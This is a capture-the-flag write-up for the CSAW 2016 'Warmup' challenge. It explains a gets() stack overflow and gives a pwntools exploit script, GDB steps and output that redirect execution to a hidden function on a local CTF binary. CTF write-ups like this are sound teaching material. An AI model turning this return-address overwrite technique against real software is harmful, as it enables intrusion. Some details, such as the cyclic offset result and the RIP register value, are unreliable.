# CSAW'16 Warmup — Buffer Overflow Exploitation

**Category:** pwn / Binary Exploitation (Warmup)  
**Challenge Name:** Warmup  
**CTF:** CSAW 2016

---

## Files provided

```
warmup      # The challenge binary (ELF 64-bit)
flag.txt    # Flag file (read by binary on success)
warm.py     # Exploit script using pwntools
```

---

## Initial Binary Run

Running the binary normally:

```
$ ./warmup
-Warm Up-
WOW:0x40060d
>AAAAAAAAAAAAAAAAAAAA
Invalid Password, Try Again!
```

The binary simply prints a prompt and takes input. Nothing interesting happens unless we give it a specific payload.

---

## Finding Hidden Functions

Let's inspect the binary using `objdump` or `radare2`:

```bash
objdump -d warmup | grep easy
```

Output:
```
000000000040060d <easy>:
```

We discovered a **hidden function** called `easy()` at address `0x40060d`.  
This is likely where the flag will be printed if execution jumps to it.

---

## Vulnerability

Looking at the decompiled code (from Ghidra or `objdump`):

```c
int main() {
    char buffer[64];           // local stack buffer
    puts("-Warm Up-");
    printf("WOW:0x40060d\n"); // prints address of easy()
    printf(">");
    gets(buffer);              // VULNERABILITY: gets() is unsafe!
    return 0;
}
```

### Why is this vulnerable?
- `gets()` reads unlimited input without bounds checking.
- By sending more than **64 bytes**, we can **overwrite the saved return address** and hijack control flow.
- This allows us to **redirect execution to `easy()`**.

---

## Finding the Exact Offset

We need to know **how many bytes** to overflow before we hit the saved return address.

Using **pwntools cyclic pattern**:

```python
from pwn import *
pattern = cyclic(200)
print(pattern)
```

Run the binary in GDB and provide this pattern as input. After the crash:

```
gdb ./warmup
run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
```

When it crashes, check the instruction pointer (RIP):

```
info registers
```

Suppose RIP contains `0x6161616c`.  
Now find offset:

```python
from pwn import *
cyclic_find(0x6161616c)
```
Output:
```
72
```

So, **72 bytes** are required to reach the saved return address.

---

## Crafting the Exploit

We want to overwrite the return address with the address of `easy()` (`0x40060d`).  
The final payload is:

- `72` bytes of padding (`"A" * 72`)
- followed by the 8-byte address of `easy()`.

**Exploit Script (`warm.py`):**
```python
from pwn import *

# start process
p = process('./warmup')

# address of easy() function
easy = 0x40060d

# payload: 72 bytes padding + address of easy()
payload = b"A" * 72 + p64(easy)

p.recvuntil(b">")
p.sendline(payload)
p.interactive()
```

---

## Running the Exploit

```
$ python3 warm.py
[+] Starting local process './warmup': pid 2023
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>
Congrats! Here is your flag: CSAW{buffer_overflow_success}
```

The program successfully jumps to `easy()` and prints the flag.

---

## GDB Walkthrough

### Load the binary in GDB:
```
gdb ./warmup
```
Set a breakpoint at `main` and run:
```
break main
run
```
Step through until after the `gets()` call:
```
nexti
```
Inspect stack before overflow:
```
x/40x $rsp
```

Send a long payload and watch the saved return address get overwritten:
```
run <<< $(python3 -c 'print("A"*80)')
```

Check registers:
```
info registers
```
Notice **RIP** now holds `0x4141414141414141` (`AAAAAAA...`) proving control of execution.

---

## Conclusion

This is a **classic warmup buffer overflow**:
- Vulnerability due to `gets()` with no bounds checking.
- Offset of **72 bytes** to reach return address.
- Redirect execution to hidden `easy()` function at `0x40060d`.
- Final payload: `b"A"*72 + p64(0x40060d)`.

By exploiting this, we get the flag and complete the challenge.

---
